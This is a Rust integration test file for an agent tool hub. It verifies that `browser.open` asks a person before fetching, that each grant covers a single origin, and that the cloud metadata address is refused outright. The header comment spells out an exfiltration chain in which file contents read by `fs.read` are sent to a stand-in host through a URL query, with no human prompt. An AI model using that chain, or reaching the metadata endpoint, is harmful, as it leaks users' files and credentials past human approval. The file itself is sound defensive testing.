//! `browser.open` asks before it fetches, and one answer covers one origin.
//!
//! Backlog T2-3, finding F-GT3 in
//! `.claude/product-review/reports/guest-tools.md`. The default policy allowed
//! `browser.open` outright, under the comment "Reading the web is browsing", so
//! the chain `fs.read` → `browser.open https://elsewhere/?q=<contents>` completed
//! with no prompt at all: `fs.read` is free, and the GET that ships its contents
//! off the machine was free too. It is the cheapest exfiltration channel in the
//! product and the only one that needs no human.
//!
//! The unit tests in `policy.rs` hold the rule and the origin arithmetic. This
//! file holds the thing they cannot: that a real hub, holding a real session and
//! a real guest, actually stops.
//!
//! **No browser is needed, and that is deliberate.** These tests are about the
//! gate, not about Chrome. Every assertion is about whether an approval request
//! appeared and what came back, so a machine with no Chromium gets the same
//! coverage rather than a skip. The call that clears the gate is allowed to fail
//! at the guest for want of a browser; only its *absence* of a prompt is asserted.

use std::sync::Arc;
use std::time::Duration;

use botroster_proto::approval::ApprovalRequestParams;
use botroster_proto::frames::*;
use botroster_proto::{
    Frame, Hello, HelloAck, Method, Outcome, Request, Response, RpcId, ServerId, SessionId,
};
use botrosterd::hub::Hub;
use botrosterd::policy::Policy;
use botrosterd::server::Server;
use futures_util::{SinkExt, StreamExt};
use serde_json::json;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::{connect_async, MaybeTlsStream, WebSocketStream};

type Sock = WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>;

/// What the hub did with one call.
#[derive(Debug, PartialEq)]
enum Gate {
    /// The hub asked a person. Carries the reason it showed them.
    Asked(String),
    /// The call was refused. Carries the message.
    Refused(String),
    /// The call reached the guest. Carries whatever came back, which without a
    /// browser is an error about the browser and is not this test's business.
    ReachedGuest(String),
}

/// A hub on the shipped default policy, a real guest bound to it, and a harness
/// with one open session.
async fn stage() -> anyhow::Result<(Sock, SessionId)> {
    stage_with(Policy::default()).await
}

/// The same, on a policy the caller chooses.
///
/// Separate from `stage` so the existing tests keep reading as the shipped
/// default, which is the thing they are about.
async fn stage_with(policy: Policy) -> anyhow::Result<(Sock, SessionId)> {
    let hub = Arc::new(Hub::with_policy(policy));
    let (listener, addr) = Server::bind("127.0.0.1:0").await?;
    tokio::spawn(Arc::new(Server::new(Arc::clone(&hub))).serve(listener));

    let url = format!("ws://{addr}/v1/tools");
    let dir = tempfile::tempdir()?;
    let ws = Arc::new(botroster_guest::Context::new(
        botroster_guest::Workspace::new(dir.path(), true)?,
        dir.path().join(".browser-profile"),
    ));
    let cfg = botroster_guest::GuestConfig {
        hub_url: url.clone(),
        server_id: "botroster-workspace".into(),
        description: "t2-3 guest".into(),
        token: None,
    };
    tokio::spawn(async move {
        let _ = botroster_guest::run(cfg, ws).await;
    });

    let mut sock = connect_async(&url).await?.0;
    sock.send(Message::Text(serde_json::to_string(&Hello::harness())?))
        .await?;
    match sock.next().await {
        Some(Ok(Message::Text(t))) => {
            let _: HelloAck = serde_json::from_str(&t)?;
        }
        other => anyhow::bail!("bad handshake reply: {other:?}"),
    }

    // Wait for the guest to register rather than sleeping a guess.
    for _ in 0..100 {
        let v = request(&mut sock, 900, Method::ServersList, json!({}), None).await?;
        if let Outcome::Result(v) = v {
            if !serde_json::from_value::<ServersListResult>(v)?
                .servers
                .is_empty()
            {
                break;
            }
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }

    let Outcome::Result(v) = request(&mut sock, 1, Method::SessionOpen, json!({}), None).await?
    else {
        anyhow::bail!("could not open a session");
    };
    let sid: SessionId = serde_json::from_value::<SessionOpenResult>(v)?.session_id;
    let bind = serde_json::to_value(SessionBindServerParams {
        server_id: ServerId::new("botroster-workspace"),
    })?;
    request(&mut sock, 2, Method::SessionBindServer, bind, Some(&sid)).await?;
    Ok((sock, sid))
}

/// Make one `browser.open` call and report what the gate did.
///
/// `answer` is what the harness says when asked. `Ok(None)` means "never answer",
/// which is how the caller tells a parked call from a completed one.
async fn open(
    sock: &mut Sock,
    sid: &SessionId,
    id: i64,
    url: &str,
    answer: Option<serde_json::Value>,
) -> anyhow::Result<Gate> {
    let call = json!({
        "call_id": format!("call-{id}"),
        "tool_id": "browser.open",
        "args": { "url": url },
    });
    let rid = RpcId::Num(id);
    let req = Request::new(rid.clone(), Method::ToolCall, Some(call)).in_session(sid.clone());
    sock.send(Message::Text(Frame::Request(req).encode()))
        .await?;

    loop {
        let msg = tokio::time::timeout(Duration::from_secs(20), sock.next())
            .await
            .map_err(|_| anyhow::anyhow!("the hub never answered the tool call"))?;
        let Some(Ok(Message::Text(t))) = msg else {
            anyhow::bail!("socket closed while waiting for the hub");
        };
        match Frame::decode(&t)? {
            Frame::Request(r) if r.parsed_method() == Some(Method::ApprovalRequest) => {
                let params: ApprovalRequestParams =
                    serde_json::from_value(r.params.clone().unwrap_or(serde_json::Value::Null))?;
                let Some(decision) = answer.clone() else {
                    // Nobody answered: the call is parked, which is the state
                    // this test is asserting.
                    return Ok(Gate::Asked(params.reason));
                };
                sock.send(Message::Text(
                    Frame::Response(Response::ok(r.id.clone(), decision)).encode(),
                ))
                .await?;
            }
            Frame::Response(r) if r.id == rid => {
                return Ok(match r.outcome {
                    Outcome::Error(e) => Gate::Refused(e.message),
                    Outcome::Result(v) => Gate::ReachedGuest(v.to_string()),
                });
            }
            _ => {}
        }
    }
}

#[tokio::test]
async fn opening_a_new_origin_parks_for_approval() {
    let (mut sock, sid) = stage().await.expect("stage");
    let gate = open(&mut sock, &sid, 10, "https://elsewhere.example/take", None)
        .await
        .expect("the hub answered");

    match gate {
        Gate::Asked(reason) => {
            // The approver is looking at the reason, not the tool name alone, so
            // it has to say what is about to happen.
            assert!(
                reason.contains("origin") || reason.contains("URL") || reason.contains("web"),
                "the approval card says {reason:?}, which does not tell the person \
                 what they are approving"
            );
        }
        other => panic!("expected the gate to ask, got {other:?}"),
    }
}

#[tokio::test]
async fn a_denial_ends_the_call() {
    let (mut sock, sid) = stage().await.expect("stage");
    let gate = open(
        &mut sock,
        &sid,
        11,
        "https://elsewhere.example/take",
        Some(json!({ "decision": "deny", "note": "not that one" })),
    )
    .await
    .expect("the hub answered");

    match gate {
        Gate::Refused(message) => assert!(
            message.contains("not that one"),
            "the refusal dropped the person's reason: {message:?}"
        ),
        other => panic!("expected a refusal, got {other:?}"),
    }
}

/// The whole point of scoping the grant: one answer, one origin.
///
/// A tool-wide grant would make the second call silent and the third silent too,
/// and the person who answered once would have allowed every host on the web for
/// the rest of the session. So the second call to the same origin must be
/// silent, and the third to a different origin must ask again.
#[tokio::test]
async fn one_answer_covers_one_origin_and_no_more() {
    let (mut sock, sid) = stage().await.expect("stage");

    let first = open(
        &mut sock,
        &sid,
        20,
        "https://example.com/one",
        Some(json!({ "decision": "allow_always" })),
    )
    .await
    .expect("the hub answered the first call");
    assert!(
        !matches!(first, Gate::Asked(_)),
        "the first call to an origin asked nothing, so the rest proves nothing: {first:?}"
    );

    // Same origin, different path: the decision has already been made.
    let second = open(&mut sock, &sid, 21, "https://example.com/two?q=hello", None)
        .await
        .expect("the hub answered the second call");
    assert!(
        !matches!(second, Gate::Asked(_)),
        "the same origin asked again after the person said yes for the session: {second:?}"
    );

    // A different origin is a different decision, whatever the answer was.
    let third = open(&mut sock, &sid, 22, "https://elsewhere.example/take", None)
        .await
        .expect("the hub answered the third call");
    assert!(
        matches!(&third, Gate::Asked(_)),
        "approving one origin silently approved another: {third:?}"
    );
}

/// A literal metadata address is refused, with nobody asked.
///
/// This is the case the refusal exists for. `169.254.169.254` is where the cloud
/// metadata service answers, and it hands out credentials to whoever asks; a
/// person shown an approval card cannot tell that from any other URL, because
/// the card would be describing an address rather than the fact that the address
/// is the one thing worth refusing.
///
/// The assertion is that `Asked` never arrives, not merely that the call failed.
/// A refusal that first parks for approval would let a person who does not read
/// the card click through, and would make this the same control as a public URL.
#[tokio::test]
async fn a_literal_metadata_address_is_refused_without_a_prompt() {
    let (mut sock, sid) = stage().await.expect("stage");
    let gate = open(
        &mut sock,
        &sid,
        30,
        "http://169.254.169.254/latest/meta-data/",
        None,
    )
    .await
    .expect("the hub answered");

    match gate {
        Gate::Refused(message) => {
            assert!(
                message.contains("169.254") || message.contains("link-local"),
                "the refusal should name the range it refused, so the reason survives \
                 into whatever read the record: {message:?}"
            );
            assert!(
                message.contains("BOTROSTER_ALLOW_PRIVATE_BROWSER_OPEN"),
                "the refusal should say how to develop against a local server, or the \
                 only way to find out is to read this file: {message:?}"
            );
        }
        other => panic!("expected a refusal with no prompt, got {other:?}"),
    }
}

/// The same address, with the opt-in set, asks instead of being refused.
///
/// The legitimate case is a Bot developing against a server on its own machine,
/// and the test that matters is that lifting the refusal lifts *only* the
/// refusal: the call still costs one approval, so the opt-in is not a switch
/// from "gated" to "ungated".
#[tokio::test]
async fn the_config_line_re_enables_a_private_destination_and_it_still_asks() {
    let (mut sock, sid) = stage_with(Policy::allowing_private_browser_destinations())
        .await
        .expect("stage");

    let gate = open(&mut sock, &sid, 31, "http://127.0.0.1:8080/dev", None)
        .await
        .expect("the hub answered");

    match gate {
        Gate::Asked(reason) => assert!(
            !reason.contains("refuses"),
            "the approval card is carrying the refusal text: {reason:?}"
        ),
        Gate::Refused(message) => panic!(
            "the opt-in did not lift the refusal: {message:?}. A Bot developing \
             against a local server has no other way in."
        ),
        Gate::ReachedGuest(v) => panic!(
            "the private destination reached the guest with nobody asked, so the \
             opt-in lifted the approval as well as the refusal: {v}"
        ),
    }
}

async fn request(
    sock: &mut Sock,
    id: i64,
    method: Method,
    params: serde_json::Value,
    session: Option<&SessionId>,
) -> anyhow::Result<Outcome> {
    let id = RpcId::Num(id);
    let mut req = Request::new(id.clone(), method, Some(params));
    if let Some(s) = session {
        req = req.in_session(s.clone());
    }
    sock.send(Message::Text(Frame::Request(req).encode()))
        .await?;
    loop {
        let msg = tokio::time::timeout(Duration::from_secs(10), sock.next())
            .await
            .map_err(|_| anyhow::anyhow!("timed out awaiting {method}"))?;
        let Some(Ok(Message::Text(t))) = msg else {
            anyhow::bail!("socket closed awaiting {method}");
        };
        if let Frame::Response(r) = Frame::decode(&t)? {
            if r.id == id {
                return Ok(r.outcome);
            }
        }
    }
}
